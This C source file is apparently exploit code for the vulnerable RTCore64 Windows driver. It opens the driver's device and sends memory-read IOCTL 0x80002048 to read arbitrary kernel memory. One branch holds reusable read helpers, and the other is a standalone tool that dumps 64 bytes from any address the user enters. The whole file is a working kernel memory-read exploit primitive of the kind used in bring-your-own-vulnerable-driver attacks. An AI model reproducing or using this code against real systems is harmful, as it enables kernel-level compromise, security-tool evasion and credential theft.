#ifdef _EXPLOIT
#include <Windows.h>

#include <stdio.h>

#include "exploitRTCore64.h"
#include "utils.h"

HANDLE hDevice = NULL;
WCHAR* DevicePath = NULL;

BOOL openRTCoreDevice() {
	// Allocate memory which will hold the device path
	DevicePath = (LPWSTR)malloc((MAX_PATH + 1) * sizeof(WCHAR));
	if (DevicePath == NULL) {
		printf("[-] Error: Couldn't allocate memory!\r\n");
		return FALSE;
	}

	// Set DevicePath to \\.\RTCore64
	swprintf_s(DevicePath, MAX_PATH, L"\\\\.\\%ws", RTC64_DEVICE_NAME_W);

	// Open handle to the device with RW access
	hDevice = CreateFileW(
		DevicePath,
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		0,
		NULL);
	if (hDevice == INVALID_HANDLE_VALUE) {
		printf("[-] Error: CreateFileW error code 0x%08x\r\n", GetLastError());
		return FALSE;
	}

	return TRUE;
}

void closeRTCoreDevice() {
	if (DevicePath) {
		free(DevicePath);
	}
	if (hDevice) {
		CloseHandle(hDevice);
	}
}

BOOL RTCoreReadDWORD(DWORD64 Address, DWORD *Value) {
	// create the structure which will be passed to the driver in the input buffer
	RTC64_MEMORY_STRUCT memory_read;
	// initialize the structure to all zeroes
	ZeroMemory(&memory_read, sizeof(memory_read));

	// set the target address to read from
	memory_read.Address = Address;
	// set how much data to read
	memory_read.Size = sizeof(DWORD);

	// the offset is not used, so it will be zero

	if (!hDevice) {
		printf("[-] Device not opened!\r\n");
		return FALSE;
	}

	// Send the IRP packet
	if (!DeviceIoControl(
		hDevice,
		RTC64_IOCTL_MEMORY_READ, // the 0x80002048 IOCTL code
		&memory_read,            // pointer to input buffer
		sizeof(memory_read),     // size of input buffer
		&memory_read,            // output is recieved in the same buffer
		sizeof(memory_read),
		NULL,
		NULL))
	{
		printf("[-] Memory Read IRP Failed!\r\n");
		return FALSE;
	}

	// The driver should've filled the Value in the structure with the data which was read
	*Value = memory_read.Value;

	return TRUE;
}

BOOL RTCoreReadMemory(DWORD64 address, BYTE* Buffer, ULONG bufferSize) {
	DWORD value;
	DWORD64 currentAddress = address;
	ULONG bytesRead = 0;

	// Read in chunks of 4 bytes (DWORD)
	while (bytesRead + sizeof(DWORD) <= bufferSize) {
		if (!RTCoreReadDWORD(currentAddress, (DWORD*)&value)) {
			return FALSE;
		}

		// Copy the 4 bytes into the buffer
		memcpy(Buffer + bytesRead, &value, sizeof(value));

		// Move the address forward by 4 bytes and update the count
		currentAddress += sizeof(value);
		bytesRead += sizeof(value);
	}

	// Handle any remaining bytes (less than 4)
	if (bytesRead < bufferSize) {
		DWORD RemainingBytes = bufferSize - bytesRead;
		if (!RTCoreReadDWORD(currentAddress, (DWORD*)&value)) {
			return FALSE;
		}
		memcpy(Buffer + bytesRead, &value, RemainingBytes);
	}

	return TRUE;
}

BOOL RTCoreReadPTR(DWORD64 Address, DWORD64* Value) {
	DWORD lowPart = 0;
	DWORD highPart = 0;

	if (!RTCoreReadDWORD(Address, &lowPart)) {
		return FALSE;
	}

	if (!RTCoreReadDWORD(Address + sizeof(DWORD), &highPart)) {
		return FALSE;
	}

	// Combine the high and low parts into the final 64-bit value
	*Value = ((DWORD64)highPart << 32) | lowPart;

	return TRUE;
}


#else

#include <windows.h>
#include <stdio.h>
#include "ExploitRTCore64.h"

#define RTC64_DEVICE_NAME_W L"RTCore64"

#define RTC64_IOCTL_MEMORY_READ 0x80002048
#define RTC64_IOCTL_MEMORY_WRITE 0x8000204c

typedef struct RTC64_MEMORY_STRUCT {
	BYTE Unknown0[8];  // offset 0x00
	DWORD64 Address;   // offset 0x08
	BYTE Unknown1[4];  // offset 0x10
	DWORD Offset;      // offset 0x14
	DWORD Size;        // offset 0x18
	DWORD Value;       // offset 0x1c
	BYTE Unknown2[16]; // offset 0x20
}RTC64_MEMORY_STRUCT, * PRTC64_MEMORY_STRUCT;

HANDLE hDevice = NULL;
WCHAR* DevicePath = NULL;

BOOL openRTCoreDevice() {
	// Allocate memory which will hold the device path
	DevicePath = (LPWSTR)malloc((MAX_PATH + 1) * sizeof(WCHAR));
	if (DevicePath == NULL) {
		printf("[-] Error: Couldn't allocate memory!\r\n");
		return FALSE;
	}

	// Set DevicePath to \\.\RTCore64
	swprintf_s(DevicePath, MAX_PATH, L"\\\\.\\%ws", RTC64_DEVICE_NAME_W);

	// Open handle to the device with RW access
	hDevice = CreateFileW(
		DevicePath,
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		0,
		NULL);
	if (hDevice == INVALID_HANDLE_VALUE) {
		printf("[-] Error: CreateFileW error code 0x%08x\r\n", GetLastError());
		return FALSE;
	}

	return TRUE;
}

void closeRTCoreDevice() {
	if (DevicePath) {
		free(DevicePath);
	}
	if (hDevice) {
		CloseHandle(hDevice);
	}
}

BOOL RTCoreReadDWORD(DWORD64 Address, DWORD* Value, DWORD ValueSize) {
	// create the structure which will be passed to the driver in the input buffer
	RTC64_MEMORY_STRUCT memory_read;
	// initialize the structure to all zeroes
	ZeroMemory(&memory_read, sizeof(memory_read));

	// set the target address to read from
	memory_read.Address = Address;
	// set how much data to read
	memory_read.Size = ValueSize;

	// the offset is not used, so it will be zero

	if (!hDevice) {
		printf("[-] Device not opened!\r\n");
		return FALSE;
	}

	// Send the IRP packet
	if (!DeviceIoControl(
		hDevice,
		RTC64_IOCTL_MEMORY_READ, // the 0x80002048 IOCTL code
		&memory_read,            // pointer to input buffer
		sizeof(memory_read),     // size of input buffer
		&memory_read,            // output is recieved in the same buffer
		sizeof(memory_read),
		NULL,
		NULL))
	{
		printf("[-] Memory Read IRP Failed!\r\n");
		return FALSE;
	}

	// The driver should've filled the Value in the structure with the data which was read
	*Value = memory_read.Value;

	return TRUE;
}

BOOL RTCoreReadMemory(DWORD64 address, BYTE* Buffer, ULONG bufferSize) {
	DWORD value;
	DWORD64 currentAddress = address;
	ULONG bytesRead = 0;

	// Read in chunks of 4 bytes (DWORD)
	while (bytesRead + sizeof(DWORD) <= bufferSize) {
		if (!RTCoreReadDWORD(currentAddress, (DWORD*)&value, sizeof(value))) {
			return FALSE;
		}

		// Copy the 4 bytes into the buffer
		memcpy(Buffer + bytesRead, &value, sizeof(value));

		// Move the address forward by 4 bytes and update the count
		currentAddress += sizeof(value);
		bytesRead += sizeof(value);
	}

	// Handle any remaining bytes (less than 4)
	if (bytesRead < bufferSize) {
		DWORD RemainingBytes = bufferSize - bytesRead;
		if (!RTCoreReadDWORD(currentAddress, (DWORD*)&value, sizeof(value))) {
			return FALSE;
		}
		memcpy(Buffer + bytesRead, &value, RemainingBytes);
	}

	return TRUE;
}

int main() {
	if (!openRTCoreDevice()) {
		closeRTCoreDevice();
		return -1;
	}

	DWORD64 address = 0;
	printf("Input target address: ");
	scanf_s("%llx", &address);

	BYTE buffer[64];
	if (!RTCoreReadMemory((DWORD64)address, (BYTE*)&buffer, sizeof(buffer))) {
		printf("[-] Read Memory Failed with error code %lu\r\n", GetLastError());
		return -1;
	}
	displayMemoryDump(buffer, sizeof(buffer));
	closeRTCoreDevice();
	return 0;
}
#endif